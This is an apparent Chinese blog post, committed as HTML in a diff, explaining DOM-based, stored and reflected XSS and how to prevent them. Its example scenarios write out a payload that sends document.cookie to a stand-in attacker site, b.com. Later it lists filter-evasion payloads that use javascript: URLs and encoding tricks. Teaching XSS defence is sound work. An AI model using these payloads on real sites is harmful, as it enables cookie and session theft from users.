@@ -1,0 +1,266 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>XSS攻击及预防 | shouliang&#39;s blog</title>
+  <meta name="author" content="shouliang">
+  
+  <meta name="description" content="Node">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XSS攻击及预防"/>
+  <meta property="og:site_name" content="shouliang&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="shouliang&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">shouliang&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">首页</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-02-18T06:45:23.000Z"><a href="/2017/02/18/网络安全/XSS攻击及预防/">2017-02-18</a></time>
+      
+      
+  
+    <h1 class="title">XSS攻击及预防</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="XSS攻击是什么"><a href="#XSS攻击是什么" class="headerlink" title="XSS攻击是什么"></a>XSS攻击是什么</h2><ul>
+<li>XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</li>
+<li>通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</li>
+<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</li>
+<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等</li>
+</ul>
+<h3 id="XSS攻击基本原理——代码注入"><a href="#XSS攻击基本原理——代码注入" class="headerlink" title="XSS攻击基本原理——代码注入"></a>XSS攻击基本原理——代码注入</h3><p>在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。<br>历史悠久的<code>SQL注入</code>和<code>XSS注入</code>都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离<code>SQL注入</code>很远了。但是，历史同样悠久的<code>XSS</code>却没有远离我们。<br><code>XSS</code>的基本实现思路很简单——比如<code>持久型XSS</code>通过一些正常的站内交互途径，例如发布评论，提交含有<code>JavaScript</code>的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
+<p>攻击分类举例</p>
+<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。<br><strong>场景一</strong>：<br>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
+<h3 id="持久型XSS"><a href="#持久型XSS" class="headerlink" title="持久型XSS"></a>持久型XSS</h3><p>也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
+<p><strong>场景二</strong>：<br>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
+<h3 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h3><ul>
+<li><p>输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
+<p>| less-than character (&lt;)                                      | &lt;                                                     |<br>| ———————————————————— | ——————————————————– |<br>| greater-than character (&gt;)                                   | &gt;                                                     |<br>| ampersand character (&amp;)                                      | &amp;                                                    |<br>| double-quote character (“)                                   | &quot;                                                   |<br>| space character( )                                           | &nbsp;                                                   |<br>| Any ASCII code character whose code is greater-than or equal to 0x80 | &amp;#<number>, where <number> is the ASCII character value. |</number></number></p>
+</li>
+</ul>
+<p>比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="noopener">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
+<ul>
+<li>输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。</li>
+</ul>
+<h3 id="使用-HttpOnly-Cookie"><a href="#使用-HttpOnly-Cookie" class="headerlink" title="使用 HttpOnly Cookie"></a>使用 HttpOnly Cookie</h3><p>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上<code>cookie</code>字段，但是在<code>js</code>脚本中却不能访问这个cookie，这样就避免了XSS攻击利用<code>JavaScript</code>的<code>document.cookie</code>获取<code>cookie</code>。</p>
+<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>单篇说</p>
+<h3 id="困难和幸运"><a href="#困难和幸运" class="headerlink" title="困难和幸运"></a>困难和幸运</h3><p>过滤 Html 标签能否防止 XSS? 请列举不能的情况?</p>
+<p>用户除了上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以使用图片 url 等方式来上传脚本进行攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以使用各种方式来回避检查, 例如空格, 回车, Tab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:</span><br><span class="line">alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=%22javascript:alert(&apos;xss&apos;);%22&gt;</span><br><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。<br>幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如<code>vue.js</code>、<code>react.js</code>等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。<br>同时，许多基于<code>MVVM</code>框架的<code>SPA</code>（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ghsau/article/details/17027893">https://blog.csdn.net/ghsau/article/details/17027893</a></p>
+<p><a href="https://www.imooc.com/article/13553">https://www.imooc.com/article/13553</a></p>
+<p><a href="https://blog.csdn.net/u011781521/article/details/53894399">https://blog.csdn.net/u011781521/article/details/53894399</a></p>
+<p><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss">https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss</a></p>
+</script></li></ul>
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/网络安全/">网络安全</a>
+  </div>
+
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">留言</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=shouliang0816";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="https://shouliang.github.io/2017/02/18/网络安全/XSS攻击及预防/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:shouliang.github.io">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">标签</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Angular/">Angular</a><small>1</small></li>
+  
+    <li><a href="/tags/Docker/">Docker</a><small>3</small></li>
+  
+    <li><a href="/tags/ES6/">ES6</a><small>4</small></li>
+  
+    <li><a href="/tags/Express/">Express</a><small>2</small></li>
+  
+    <li><a href="/tags/Git/">Git</a><small>7</small></li>
+  
+    <li><a href="/tags/Gulp/">Gulp</a><small>4</small></li>
+  
+    <li><a href="/tags/Javascript/">Javascript</a><small>2</small></li>
+  
+    <li><a href="/tags/MongoDB/">MongoDB</a><small>2</small></li>
+  
+    <li><a href="/tags/Mongoose/">Mongoose</a><small>6</small></li>
+  
+    <li><a href="/tags/Node-js-IO/">Node.js_IO</a><small>4</small></li>
+  
+    <li><a href="/tags/Node-js-JS基础/">Node.js_JS基础</a><small>4</small></li>
+  
+    <li><a href="/tags/Node-js-事件/">Node.js_事件</a><small>4</small></li>
+  
+    <li><a href="/tags/Node-js-入门/">Node.js_入门</a><small>9</small></li>
+  
+    <li><a href="/tags/Node-js-异步编程/">Node.js_异步编程</a><small>3</small></li>
+  
+    <li><a href="/tags/Node-js-模块/">Node.js_模块</a><small>5</small></li>
+  
+    <li><a href="/tags/Node-js-测试/">Node.js_测试</a><small>5</small></li>
+  
+    <li><a href="/tags/Node-js-网络/">Node.js_网络</a><small>1</small></li>
+  
+    <li><a href="/tags/Node-js-进程/">Node.js_进程</a><small>2</small></li>
+  
+    <li><a href="/tags/Node-js-错误处理和调试/">Node.js_错误处理和调试</a><small>5</small></li>
+  
+    <li><a href="/tags/Redis/">Redis</a><small>2</small></li>
+  
+    <li><a href="/tags/Shell/">Shell</a><small>1</small></li>
+  
+    <li><a href="/tags/Unix/">Unix</a><small>3</small></li>
+  
+    <li><a href="/tags/express/">express</a><small>0</small></li>
+  
+    <li><a href="/tags/redis/">redis</a><small>0</small></li>
+  
+    <li><a href="/tags/shell/">shell</a><small>0</small></li>
+  
+    <li><a href="/tags/区块链/">区块链</a><small>1</small></li>
+  
+    <li><a href="/tags/存储/">存储</a><small>0</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>0</small></li>
+  
+    <li><a href="/tags/数据库/">数据库</a><small>3</small></li>
+  
+    <li><a href="/tags/网络安全/">网络安全</a><small>8</small></li>
+  
+    <li><a href="/tags/计算机网络/">计算机网络</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2018 shouliang
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
